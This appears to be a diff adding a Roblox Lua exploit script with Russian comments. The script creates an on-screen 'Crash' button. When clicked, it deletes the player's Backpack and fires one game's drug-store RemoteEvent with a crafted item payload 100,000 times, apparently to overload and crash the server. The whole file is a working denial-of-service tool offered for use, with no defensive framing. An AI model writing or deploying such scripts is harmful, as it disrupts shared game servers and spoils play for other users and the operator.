@@ -1,1 +1,55 @@
-crash
+local args = {
+    [1] = {
+        ["Intro"] = "\229\145\131\229\149\138\229\149\138\240\159\144\141",
+        ["Price"] = 0,
+        ["Level"] = 1,
+        ["Info"] = {
+            ["Number1"] = {
+                ["Text1"] = "\231\136\189\229\186\166",
+                ["Text2"] = "\232\182\133\231\186\167\233\171\152"
+            }
+        },
+        ["DisplayName"] = "_ERADICATOR"
+    }
+}
+
+local Player = game:GetService("Players").LocalPlayer
+
+-- Создание ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CrashGui"
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ResetOnSpawn = false -- Чтобы не исчезала при респавне
+
+-- Создание кнопки
+local CrashButton = Instance.new("TextButton")
+CrashButton.Name = "CrashButton"
+CrashButton.Parent = ScreenGui -- Кнопка теперь внутри ScreenGui
+CrashButton.Text = "Crash"
+CrashButton.Size = UDim2.new(0, 200, 0, 50)
+CrashButton.Position = UDim2.new(0, 1000, 0, 10)
+CrashButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Красный цвет
+CrashButton.Draggable = true
+
+-- Функция для выполнения скрипта
+local function RunScript()
+    local Event = Player.PlayerGui.GameGui.DrugStoreGui.ShopFrame.ItemsFrame.LocalScript.Event
+    local repetitions = 100000 -- Измените это значение, чтобы задать количество повторений
+
+    -- Удаление Backpack
+    if Player:FindFirstChild("Backpack") then
+        Player.Backpack:Destroy()
+        print("Backpack удален.")
+    else
+        print("Backpack не найден.")
+    end
+
+    for i = 1, repetitions do
+        Event:FireServer(unpack(args))
+    end
+
+    print("Скрипт выполнен " .. repetitions .. " раз.")
+end
+
+-- Подключение функции к кнопке
+CrashButton.MouseButton1Click:Connect(RunScript)
